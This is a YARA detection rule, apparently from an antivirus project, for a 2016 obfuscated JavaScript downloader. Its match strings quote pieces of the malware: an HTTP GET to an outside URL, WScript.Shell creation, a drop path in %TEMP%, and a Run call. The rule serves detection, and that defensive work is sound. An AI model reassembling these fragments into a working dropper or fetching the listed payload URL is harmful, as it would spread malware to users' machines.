rule sig_20160427_eb9b42711a04259beb0d0bd3acdd3c77 {
  meta:
    description = "datamaliciousorder - file 20160427_eb9b42711a04259beb0d0bd3acdd3c77.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e56e772f874ca3ab5a7445fbd87f9d6990fb072fb52e7ad9af6dc2bc64348ec1"

  strings:
    $s1  = "DirnhAjumc[OjgsvWxrwh](\"G\" + \"ET\", \"http://haraccountants.co.uk/k9sjf\", false);" fullword ascii
    $s2  = "function SnpajWwugw() {return XpkcdKxfet[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"omDJzyG" ascii
    $s3  = "function SnpajWwugw() {return XpkcdKxfet[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"omDJzyG" ascii
    $s4  = "var XpkcdKxfet = function JfngoKdefz() {return AedjjTfbik[AwfzfFloel](\"WScript\"+\".Shell\");}(), YmxfaNkczs = 11;" fullword ascii
    $s5  = "function KpmlmMwuxk(MiezkIcjas, RfnzqJnqfd){RtkjdOnhrd = RtkjdOnhrd * 1; return MiezkIcjas - RfnzqJnqfd;};" fullword ascii
    $s6  = "var AedjjTfbik = this[\"WScript\"];" fullword ascii
    $s7  = "function AcqmtWoapw(){return PjikuGycnp + \"\";};" fullword ascii
    $s8  = "if (DirnhAjumc[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function RgfmqBewfw() {return ((PsdybTpswb == true) && (PsdybTpswb == AtwtfKygok)) ? 1 : RtkjdOnhrd;};" fullword ascii
    $s10 = "function UfngmDjkdy()" fullword ascii
    $s11 = "PsdybTpswb = true; " fullword ascii
    $s12 = "function MjggbFotwa(HryabAhcde) {var HedrlTzekm = (1, 2, 3, 4, 5, HryabAhcde); return HedrlTzekm;};" fullword ascii
    $s13 = "function LisvnCuyyf(UkbmmGumai){XpkcdKxfet[\"R\"+\"un\"](UkbmmGumai, RtkjdOnhrd, RtkjdOnhrd);};" fullword ascii
    $s14 = "function GkcrfLbgww(){return 23;};" fullword ascii
    $s15 = "function CrdzrMngek(){return AwfzfFloel;};" fullword ascii
    $s16 = "return KpmlmMwuxk(WrlijEjson, BzueuJopzv);" fullword ascii
    $s17 = "AtwtfKygok = true; " fullword ascii
    $s18 = "var AtwtfKygok = false;" fullword ascii
    $s19 = "GorvnQsaht = true;" fullword ascii
    $s20 = "var PsdybTpswb = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}